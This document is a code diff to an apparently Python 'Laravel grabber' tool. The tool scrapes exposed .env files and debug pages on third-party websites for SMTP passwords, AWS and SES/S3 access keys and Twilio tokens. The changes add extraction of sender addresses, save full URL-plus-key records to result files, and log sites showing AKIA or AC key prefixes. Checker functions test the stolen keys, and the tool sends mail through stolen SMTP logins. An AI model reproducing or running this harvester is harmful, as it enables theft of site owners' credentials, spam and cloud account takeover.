@@ -210,10 +210,24 @@ class grabber:
                                     pw = pw.replace('\r', '')
                                 if ' ' in pw:
                                     pw = pw.replace(' ','')
+                                try:
+                                 mailfrom = re.findall("MAIL_FROM_ADDRESS=(.*?)", teks)[iii]
+                                except:
+                                 try:
+                                  mailfrom = re.findall("MAIL_ADDRESS=(.*?)\n", teks)[iii]
+                                 except:
+                                  try:
+                                   mailfrom = re.findall('MAIL_FROM=(.*?)\n', teks)[iii]
+                                  except:
+                                   mailfrom = ' '
+                                if '\r' in mailfrom:
+                                    mailfrom = mailfrom.replace('\r', '')
+                                if ' ' in mailfrom:
+                                    mailfrom = mailfrom.replace(' ','')
                                 if user == 'null' or user == '""' or user == '' or '****' in user or '$_SERVER' in user:
                                     pass
                                 else:
-                                    satu = clean(urlku + '|' + host + '|' + port + '|' + user + '|' + pw)
+                                    satu = clean(urlku + '|' + host + '|' + port + '|' + user + '|' + pw + '|' + mailfrom)
                                     if '.gmail.com' in host or '.googlemail.com' in host:
                                         with open('Result/SMTP/gmail.txt', 'a') as pow:
                                             pow.write(satu + '\n')
@@ -318,10 +332,24 @@ class grabber:
                         if '\r' in pw:
                             pw = pw.replace('\r', '')
                         pw = pw.replace(' ','')
+                        try:
+                         mailfrom = re.findall("MAIL_FROM_ADDRESS=(.*?)", teks)[0]
+                        except:
+                         try:
+                          mailfrom = re.findall("MAIL_ADDRESS=(.*?)\n", teks)[0]
+                         except:
+                          try:
+                            mailfrom = re.findall('MAIL_FROM=(.*?)\n', teks)[0]
+                          except:
+                            mailfrom = ' '
+                        if '\r' in mailfrom:
+                                    mailfrom = mailfrom.replace('\r', '')
+                        if ' ' in mailfrom:
+                                    mailfrom = mailfrom.replace(' ','')
                         if user == 'null' or user == '""' or user == '' or '****' in user or "$_SERVER['MAIL_USERNAME']" in user:
                             pass
                         else:
-                            satu = clean(urlku + '|' + host + '|' + port + '|' + user + '|' + pw)
+                            satu = clean(urlku + '|' + host + '|' + port + '|' + user + '|' + pw + '|' + mailfrom)
                             # print(satu)
                             # with open('Result/smtp.txt','a') as tulis:
                             #    tulis.write(satu+'\n')
@@ -421,10 +449,24 @@ class grabber:
                     pw = re.findall('SMTP_PASSWORD=(.*?)\n', teks)[0]
                     if '\r' in pw:
                         pw = pw.replace('\r', '')
+                    try:
+                     mailfrom = re.findall("MAIL_FROM_ADDRESS=(.*?)", teks)[iii]
+                    except:
+                     try:
+                      mailfrom = re.findall("MAIL_ADDRESS=(.*?)\n", teks)[iii]
+                     except:
+                      try:
+                       mailfrom = re.findall('MAIL_FROM=(.*?)\n', teks)[iii]
+                      except:
+                        mailfrom = ' '
+                    if '\r' in mailfrom:
+                                    mailfrom = mailfrom.replace('\r', '')
+                    if ' ' in mailfrom:
+                                    mailfrom = mailfrom.replace(' ','')
                     if user == 'null' or user == '""' or user == '' or '****' in user:
                         pass
                     else:
-                        satu = clean(urlku + '|' + host + '|' + port + '|' + user + '|' + pw)
+                        satu = clean(urlku + '|' + host + '|' + port + '|' + user + '|' + pw + '|' + mailfrom)
                         # with open('Result/smtp.txt','a') as tulis:
                         #    tulis.write(satu+'\n')
                         if '.gmail.com' in host or '.googlemail.com' in host:
@@ -798,8 +840,11 @@ class grabber:
 
     def get_aws(self, method, urlku, teks):
         objek = 0
+        
         if method == 'env':
+         try:  
             if 'AWS_ACCESS_KEY_ID=' in teks:
+               #try:
                 try:
                     key = re.findall('AWS_ACCESS_KEY_ID=(.*?)\n', teks)[0]
                     if '\r' in key:
@@ -859,19 +904,18 @@ class grabber:
                         pass
                     else:
                         asu = str(urlku) + "|" + str(key) + "|" + str(sec) + '|' + str(region)
-                        asu1 = clean(key + "|" + sec + '|' + region)
                         if region == 'aws_unknown_region--':
                             with open('Result/aws_unknown_region.txt', 'a') as ppp:
-                                ppp.write(asu1 + '\n')
+                                ppp.write(asu + '\n')
                             ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],'us-west-2')
                         else:
                             with open('Result/aws.txt', 'a') as ppp:
-                                ppp.write(asu1 + '\n')
+                                ppp.write(asu + '\n')
                             ceker_aws(urlku, asu.split('|')[1], asu.split('|')[2], asu.split('|')[3])
                             # print(asu)
                             objek += 1
                 except:
-                    pass
+                     pass
             if 'AWS_ACCESS_KEY_ID_S3=' in teks:
                 try:
                     key = re.findall('AWS_ACCESS_KEY_ID_S3=(.*?)\n', teks)[0]
@@ -900,18 +944,17 @@ class grabber:
                         pass
                     else:
                         asu = clean(urlku + "|" + key + "|" + sec + '|' + region)
-                        asu1 = clean(key + "|" + sec + '|' + region)
                         if region == 'aws_unknown_region--':
                             with open('Result/aws_unknown_region.txt', 'a') as ppp:
-                                ppp.write(asu1 + '\n')
+                                ppp.write(asu + '\n')
                             ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],'us-west-2')
                         else:
                             with open('Result/aws.txt', 'a') as ppp:
-                                ppp.write(asu1 + '\n')
+                                ppp.write(asu + '\n')
                             ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],asu.split[3])
                         objek += 1
                 except:
-                    pass
+                     pass
             if "AWS_KEY=" in teks:
                 try:
                     key = re.findall('AWS_KEY=(.*?)\n', teks)[0]
@@ -932,18 +975,17 @@ class grabber:
                         pass
                     else:
                         asu = clean(urlku + "|" + key + "|" + sec + '|' + region)
-                        asu1 = clean(key + "|" + sec + '|' + region)
                         if region == 'aws_unknown_region--':
                             with open('Result/aws_unknown_region.txt', 'a') as ppp:
-                                ppp.write(asu1 + '\n')
+                                ppp.write(asu + '\n')
                             ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],'us-west-2')
                         else:
                             with open('Result/aws.txt', 'a') as ppp:
-                                ppp.write(asu1 + '\n')
+                                ppp.write(asu + '\n')
                             ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],asu.split('|')[3])
                         objek += 1
                 except:
-                    pass
+                     pass
             if 'SES_KEY=' in teks:
                 try:
                     key = re.findall('SES_KEY=(.*?)\n', teks)[0]
@@ -970,18 +1012,17 @@ class grabber:
                         pass
                     else:
                         asu = clean(urlku + "|" + key + "|" + sec + '|' + region)
-                        asu1 = clean(key + "|" + sec + '|' + region)
                         if region == 'aws_unknown_region--':
                             with open('Result/aws_unknown_region.txt', 'a') as ppp:
-                                ppp.write(asu1 + '\n')
+                                ppp.write(asu + '\n')
                             ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],'us-west-2')
                         else:
                             with open('Result/aws.txt', 'a') as ppp:
-                                ppp.write(asu1 + '\n')
+                                ppp.write(asu + '\n')
                             ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],asu.split('|')[3])
                         objek += 1
                 except:
-                    pass
+                     pass
             if 'S3_KEY=' in teks:
                 try:
                     key = re.findall('S3_KEY=(.*?)\n', teks)[0]
@@ -1007,19 +1048,18 @@ class grabber:
                     if key == 'null' or key == '' or key == '""' or sec == '':
                         pass
                     else:
-                        asu1 = clean(key + "|" + sec + '|' + region)
                         asu = clean(urlku + "|" + key + "|" + sec + '|' + region)
                         if region == 'aws_unknown_region--':
                             with open('Result/aws_unknown_region.txt', 'a') as ppp:
-                                ppp.write(asu1 + '\n')
+                                ppp.write(asu + '\n')
                             ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],'us-west-2')
                         else:
                             with open('Result/aws.txt', 'a') as ppp:
-                                ppp.write(asu1 + '\n')
+                                ppp.write(asu + '\n')
                             ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],asu.split('|')[3])
                         objek += 1
                 except:
-                    pass
+                     pass
             if 'AWS_S3_KEY=' in teks:
                 try:
                     key = re.findall('AWS_S3_KEY=(.*?)\n', teks)[0]
@@ -1046,23 +1086,31 @@ class grabber:
                         pass
                     else:
                         asu = clean(urlku + "|" + key + "|" + sec + '|' + region)
-                        asu1 = clean(key + "|" + sec + '|' + region)
                         if region == 'aws_unknown_region--':
                             with open('Result/aws_unknown_region.txt', 'a') as ppp:
-                                ppp.write(asu1 + '\n')
+                                ppp.write(asu + '\n')
                             ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],'us-west-2')
                         else:
                             with open('Result/aws.txt', 'a') as ppp:
-                                ppp.write(asu1 + '\n')
+                                ppp.write(asu + '\n')
                             ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],asu.split('|')[3])
                         objek += 1
                 except:
-                    pass
+                     pass
             if objek == 0:
                 return False
             else:
                 return objek
+         except:
+             try:
+                if '=AKIA' in teks:
+                      with open('Result/awsku.txt', 'a') as epep:
+                          epep.write(urlku + '\n')
+                          objek += 1
+             except:
+              pass
         elif method == 'debug':
+         try:   
             if 'AWS_ACCESS_KEY_ID' in teks:
                 try:
                     key = re.findall('<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
@@ -1109,18 +1157,17 @@ class grabber:
                         pass
                     else:
                         asu = clean(urlku + "|" + key + "|" + sec + '|' + region)
-                        asu1 = clean(key + "|" + sec + '|' + region)
                         if region == 'aws_unknown_region--':
                             with open('Result/aws_unknown_region.txt', 'a') as ppp:
-                                ppp.write(asu1 + '\n')
+                                ppp.write(asu + '\n')
                             ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],'us-west-2')
                         else:
                             with open('Result/aws.txt', 'a') as ppp:
-                                ppp.write(asu1 + '\n')
+                                ppp.write(asu + '\n')
                             ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],asu.split('|')[3])
                         objek += 1
                 except:
-                    pass
+                     pass
             if "AWS_KEY" in teks:
                 try:
                     key = re.findall('<td>AWS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
@@ -1139,18 +1186,23 @@ class grabber:
                         pass
                     else:
                         asu = clean(urlku + "|" + key + "|" + sec + '|' + region)
-                        asu1 = clean(key + "|" + sec + '|' + region)
                         if region == 'aws_unknown_region--':
                             with open('Result/aws_unknown_region.txt', 'a') as ppp:
-                                ppp.write(asu1 + '\n')
+                                ppp.write(asu + '\n')
                             ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],'us-west-2')
                         else:
                             with open('Result/aws.txt', 'a') as ppp:
-                                ppp.write(asu1 + '\n')
+                                ppp.write(asu + '\n')
                             ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],asu.split('|')[3])
                         objek += 1
                 except:
-                    pass
+                    try:
+                     if '>AKIA' in teks:
+                      with open('Result/awsku.txt', 'a') as epep:
+                          epep.write(urlku + '\n')
+                          objek += 1
+                    except:
+                     pass
             if "S3_KEY" in teks:
                 try:
                     key = re.findall('<td>S3_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
@@ -1169,18 +1221,23 @@ class grabber:
                         pass
                     else:
                         asu = clean(urlku + "|" + key + "|" + sec + '|' + region)
-                        asu1 = clean(key + "|" + sec + '|' + region)
                         if region == 'aws_unknown_region--':
                             with open('Result/aws_unknown_region.txt', 'a') as ppp:
-                                ppp.write(asu1 + '\n')
+                                ppp.write(asu + '\n')
                             ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],'us-west-2')
                         else:
                             with open('Result/aws.txt', 'a') as ppp:
-                                ppp.write(asu1 + '\n')
+                                ppp.write(asu + '\n')
                             ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],asu.split('|')[3])
                         objek += 1
                 except:
-                    pass
+                    try:
+                     if '>AKIA' in teks:
+                      with open('Result/awsku.txt', 'a') as epep:
+                          epep.write(urlku + '\n')
+                          objek += 1
+                    except:
+                     pass
             if "AWS_S3_KEY" in teks:
                 try:
                     key = re.findall('<td>AWS_S3_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
@@ -1199,28 +1256,42 @@ class grabber:
                         pass
                     else:
                         asu = clean(urlku + "|" + key + "|" + sec + '|' + region)
-                        asu1 = clean(key + "|" + sec + '|' + region)
                         if region == 'aws_unknown_region--':
                             with open('Result/aws_unknown_region.txt', 'a') as ppp:
-                                ppp.write(asu1 + '\n')
+                                ppp.write(asu + '\n')
                             ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],'us-west-2')
                         else:
                             with open('Result/aws.txt', 'a') as ppp:
-                                ppp.write(asu1 + '\n')
+                                ppp.write(asu + '\n')
                             ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],asu.split('|')[3])
                         objek += 1
                 except:
-                    pass
+                    try:
+                     if '>AKIA' in teks:
+                      with open('Result/awsku.txt', 'a') as epep:
+                          epep.write(urlku + '\n')
+                          objek += 1
+                    except:
+                     pass
             if objek == 0:
                 return False
             else:
                 return objek
+         except:
+             try:
+                if '=AKIA' in teks:
+                      with open('Result/awsku.txt', 'a') as epep:
+                          epep.write(urlku + '\n')
+                          objek += 1
+             except:
+                pass
         else:
             return False
 
     def get_twilio(self, method, urlku, teks):
         objek = 0
         if method == 'env':
+            
             if 'TWILIO_SID=' in teks:
                 try:
                     sid = re.findall('TWILIO_SID=(.*?)\n', teks)[0]
@@ -1238,7 +1309,13 @@ class grabber:
                         ceker_twilio(urlku, sid, token)
                         objek += 1
                 except:
-                    pass
+                    try:
+                     if '=AC' in teks:
+                      with open('Result/tw.txt', 'a') as epep:
+                          epep.write(urlku + '\n')
+                          objek += 1
+                    except:
+                     pass
             if 'TWILIO_ACCOUNT_SID=' in teks:
                 try:
                     sid = re.findall('TWILIO_ACCOUNT_SID=(.*?)\n', teks)[0]
@@ -1256,7 +1333,13 @@ class grabber:
                         ceker_twilio(urlku, sid, token)
                         objek += 1
                 except:
-                    pass
+                    try:
+                     if '=AC' in teks:
+                      with open('Result/tw.txt', 'a') as epep:
+                          epep.write(urlku + '\n')
+                          objek += 1
+                    except:
+                     pass
             if objek == 0:
                 return False
             else:
@@ -1279,7 +1362,13 @@ class grabber:
                         ceker_twilio(urlku, sid, token)
                         objek += 1
                 except:
-                    pass
+                    try:
+                     if '>AC' in teks:
+                      with open('Result/tw.txt', 'a') as epep:
+                          epep.write(urlku + '\n')
+                          objek += 1
+                    except:
+                     pass
             if 'TWILIO_ACCOUNT_SID' in teks:
                 try:
                     sid = re.findall('<td>TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
@@ -1297,7 +1386,13 @@ class grabber:
                         ceker_twilio(urlku, sid, token)
                         objek += 1
                 except:
-                    pass
+                    try:
+                     if '>AC' in teks:
+                      with open('Result/tw.txt', 'a') as epep:
+                          epep.write(urlku + '\n')
+                          objek += 1
+                    except:
+                     pass
             if objek == 0:
                 return False
             else:
@@ -2079,21 +2174,32 @@ def smtp_login(target, tutor, hostnya, portnya, usernya, pwnya,mail_fromer=False
         if comment:
             msg.attach(MIMEText(comment, 'html', 'utf-8'))
         else:
-            msg.attach(MIMEText('host => {}<br>port => {}<br>user => {}<br>password => {}<br>from mail => {}<br>from name => {} <br><br>SMTP Tested By Ridho'.format(hostnya, portnya, usernya, pwnya, sender, mail_name), 'html', 'utf-8'))
+            msg.attach(MIMEText(""" 
+            
+                <p>HOST : """ + hostnya + """</p>
+                <p>PORT : """ + portnya + """</p>
+                <p>USER : """ + usernya + """</p>
+                <p>PASS : """ + pwnya + """</p>
+                <p>FROM : """ + mailfrom + """</p> 
+                """, 'html', 'utf-8'))
     else:
         if comment:
             msg.attach(MIMEText(comment, 'html', 'utf-8'))
         else:
-            msg.attach(MIMEText('host => {}<br>port => {}<br>user => {}<br>password => {}<br>from mail => {}<br><br>SMTP Tested By Ridho'.format(hostnya, portnya, usernya, pwnya, sender), 'html', 'utf-8'))
+            msg.attach(MIMEText(""" <p>HOST : """ + hostnya + """</p>
+                <p>PORT : """ + portnya + """</p>
+                <p>USER : """ + usernya + """</p>
+                <p>PASS : """ + pwnya + """</p>
+                <p>FROM : """ + mailfrom + """</p>""", 'html', 'utf-8'))
     try:
-        server = smtplib.SMTP(hostnya, int(portnya),timeout=15)
+        server = smtplib.SMTP(hostnya, int(portnya),timeout=10)
         server.login(usernya, pwnya)
         server.sendmail(sender, [msg['to']], msg.as_string())
         server.quit()
         if mail_name:
-            open('Result/SMTP/smtp_live.txt', 'a').write('-' * 33 + '\nMAIL_HOST={}\nMAIL_PORT={}\nMAIL_USERNAME={}\nMAIL_PASSWORD={}\nMAIL_FROM_ADDRESS={}\nMAIL_FROM_NAME={}\n'.format(hostnya, portnya, usernya, pwnya, sender, mail_name))
+            open('Result/SMTP/smtp_live.txt', 'a').write('-' * 33 + '{}|{}|{}|{}\n'.format(hostnya, portnya, usernya, pwnya))
         else:
-            open('Result/SMTP/smtp_live.txt', 'a').write('-' * 33 + '\nMAIL_HOST={}\nMAIL_PORT={}\nMAIL_USERNAME={}\nMAIL_PASSWORD={}\nMAIL_FROM_ADDRESS={}\n'.format(hostnya, portnya, usernya, pwnya, sender))
+            open('Result/SMTP/smtp_live.txt', 'a').write('-' * 33 + '{}|{}|{}|{}\n'.format(hostnya, portnya, usernya, pwnya))
     except:
         try:
             server = smtplib.SMTP(hostnya, int(portnya),timeout=15)
@@ -2102,9 +2208,9 @@ def smtp_login(target, tutor, hostnya, portnya, usernya, pwnya,mail_fromer=False
             server.sendmail(sender, [msg['to']], msg.as_string())
             server.quit()
             if mail_name:
-                open('Result/SMTP/smtp_live.txt', 'a').write('-' * 33 + '\nMAIL_HOST={}\nMAIL_PORT={}\nMAIL_USERNAME={}\nMAIL_PASSWORD={}\nMAIL_FROM_ADDRESS={}\nMAIL_FROM_NAME={}\n'.format(hostnya, portnya, usernya, pwnya, sender, mail_name))
+                open('Result/SMTP/smtp_live.txt', 'a').write('-' * 33 + '{}|{}|{}|{}\n'.format(hostnya, portnya, usernya, pwnya))
             else:
-                open('Result/SMTP/smtp_live.txt', 'a').write('-' * 33 + '\nMAIL_HOST={}\nMAIL_PORT={}\nMAIL_USERNAME={}\nMAIL_PASSWORD={}\nMAIL_FROM_ADDRESS={}\n'.format(hostnya, portnya, usernya, pwnya, sender))
+                open('Result/SMTP/smtp_live.txt', 'a').write('-' * 33 + '{}|{}|{}|{}\n'.format(hostnya, portnya, usernya, pwnya))
         except:
             pass
 
@@ -2542,36 +2648,13 @@ def random_color():
     return random.choice(tuple(colors))
 def banner():
     print('''
-    {}=,    (\_/)    ,=  ( Author : hchdh )
-     {}/`-'--(")--'-'\   ( fb     : fb.me/mita )
-    {}/     (___)     \  ( wa     : wa.me/+628311    )
+    {}=,    (\_/)    ,=  
+     {}/`-'--(")--'-'\   
+    {}/     (___)     \  
    {}/.-.-./ " " \.-.-.\ ( version : 1.5 )
 '''.format(random_color(),random_color(),random_color(),random_color()))
     print('-' * 50)
 
 
-def license():
-    user = uuid.getnode()
-    database = requests.get('https://raw.githubusercontent.com/ridhoNoob/lisensi/main/pepek.txt').text
-    if str(user) in database:
-        return True
-    else:
-        return False
-
-
 banner()
 laravel_grabber()
-"""
-p = license()
-if p:
-    os.system('cls' if os.name=='nt' else 'clear')
-    banner()
-    laravel_grabber()
-else:
-    from getpass import getpass
-    banner()
-    code = uuid.getnode()
-    print('\t    Code : {}'.format(code))
-    print('\n\033[33m[#] Please send the code to the author for activation')
-    getpass('')
-"""
